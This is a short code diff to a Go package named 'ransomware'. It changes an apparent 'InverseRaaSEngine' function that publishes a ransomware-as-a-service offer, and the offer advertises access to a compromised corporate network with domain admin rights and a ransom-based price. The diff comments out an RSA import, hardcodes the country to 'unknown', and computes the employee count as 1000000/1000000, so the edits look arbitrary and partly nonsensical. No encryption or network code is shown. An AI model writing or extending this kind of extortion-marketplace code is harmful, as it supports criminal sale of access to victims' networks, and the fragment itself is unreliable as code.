@@ -2,7 +2,7 @@ package ransomware
 
 import (
 	"crypto/rand"
-	"crypto/rsa"
+	// "crypto/rsa"
 	"crypto/sha256"
 	"encoding/hex"
 	"encoding/json"
@@ -160,9 +160,9 @@ func (ir *InverseRaaSEngine) publishOffer() {
 	offer := RaaSOffer{
 		TargetID:      ir.TargetID,
 		Description:   "High-value corporate network fully compromised. Domain admin access. 2000+ workstations.",
-		Country:       ir.config.TargetCountry,
+		Country:       "unknown",
 		Revenue:       "50M-200M",
-		Employees:     ir.config.MaxFileSize / 1000000,
+		Employees:     1000000 / 1000000,
 		BasePrice:     ir.config.RansomAmount * 0.2,
 		JoinFee:       ir.config.RansomAmount * 0.05,
 		AvailableFrom: time.Now().Format(time.RFC3339),
